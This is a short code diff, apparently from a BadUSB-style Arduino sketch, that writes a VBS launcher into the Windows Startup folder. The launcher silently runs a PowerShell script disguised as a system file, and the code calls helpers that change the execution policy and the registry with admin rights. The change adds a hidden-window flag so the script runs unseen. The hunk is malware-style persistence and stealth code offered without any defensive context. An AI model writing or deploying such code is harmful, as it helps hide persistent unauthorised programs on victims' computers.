@@ -13,7 +13,7 @@ void setup() {
   String path01 = "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows.vbs";
   String vbsContent = "command = \"powershell.exe -nologo -command C:\\Windows\\System32\\Windows.ps1\"\nset shell = CreateObject(\"WScript.Shell\")\nshell.Run command,0";
   String createVBS = "powershell.exe echo $null > \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\Windows.vbs\"";
-  String runVBS = "powershell.exe C:\\Windows\\System32\\Windows.ps1";
+  String runVBS = "powershell.exe -windowstyle hidden C:\\Windows\\System32\\Windows.ps1";
 
   powAdmin(execPolicy);
   powAdmin(RegEdit);
